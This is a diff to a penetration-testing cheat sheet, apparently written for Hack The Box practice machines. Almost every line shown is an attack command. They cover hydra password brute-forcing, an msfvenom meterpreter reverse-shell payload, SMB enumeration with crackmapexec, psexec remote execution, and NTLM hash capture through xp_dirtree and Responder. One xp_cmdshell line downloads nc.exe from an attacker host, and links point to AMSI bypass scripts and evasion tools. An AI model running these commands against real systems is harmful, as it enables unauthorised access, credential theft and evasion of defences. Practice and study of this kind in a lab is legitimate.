@@ -7,6 +7,7 @@ HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -vV -C /usr/share/seclists/Password
   hydra -l floris -P /usr/share/wordlists/rockyou.txt 10.10.10.150 http-post "/index.php:username=^USER^&passwd=^PASS^&Login:Warning"
 
 Msfvenom
+  https://github.com/g0tmi1k/msfpc (G0tmi1k msfvenom script)
   https://netsec.ws/?p=331 (examples)
   Msfvenom -l formats (list format such as asp, dll, exe, war)
   Msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.17 LPORT=9001 -f war -o filename.war
@@ -99,18 +100,13 @@ SMB Mount Share
 SMBcacls
   smbcacls -N //10.10.10.97/sharename /folder (Prints out NTFS permissions)
   
+Crackmapexec
+  crackmapexec 10.10.10.125 --share -u ' ' -p ' ' (View SMB Shares)
+  
 SCF (Shell Command Files)
   If you can write to a share you can create a SCF file which points an ICONfile to a local share to grab creds with responder.
   https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
   
-SQL
-  select @@version
-  enable xp_cmdshell
-  xp_dirtree '\\10.10.14.171\file' (Start responder and catch the NTLMv2)
-  xp_cmdshell "command"
-  Upload File
-    xp_cmdshell "powershell.exe /c IEX (New-Object Net.WebClient).DownloadFile(\"http://10.10.14.171:8000/nc.exe\", \"c:\users\mssql-svc\documents\nc.exe\")"
-
 File Transfer
   Web Server
     python -m SimpleHTTPServer <port / default 8000>
@@ -127,9 +123,18 @@ NetCat
 Responder (Can grab hash when a system is attempting to connect to you over SMB)
   responder -I tun0
   
+SQL
+  select @@version
+  enable xp_cmdshell
+  xp_dirtree '\\10.10.14.171\file' (Start responder and catch the NTLMv2)
+  xp_cmdshell "command"
+  Upload File
+    xp_cmdshell "powershell.exe /c IEX (New-Object Net.WebClient).DownloadFile(\"http://10.10.14.171:8000/nc.exe\", \"c:\users\mssql-svc\documents\nc.exe\")"
+
 Impacket MSSQL Client
   python mssqlclient.py -p 1433 reporting:@10.10.10.125 -windows-auth
-  --paste password in
+  python psexec.py username:password@10.10.10.125 cmd -path c:\\windows\\system32\\
+     --password can be left out and it will prompt
 
 Empire 
   https://null-byte.wonderhowto.com/how-to/use-powershell-empire-getting-started-with-post-exploitation-windows-hosts-0178664/
@@ -176,6 +181,12 @@ Python Bash Shell
   Ctrl+z to background
   stty raw -echo
   fg+Enter and hit enter twice
+  
+AMSI
+  amsituils (Test if AMSI is enabled)
+  Bypass:
+     Rasyamouse has a ps1 and C# script.
+     https://github.com/rasta-mouse/AmsiScanBufferBypass
 
 Phamton Evasion
 Veil
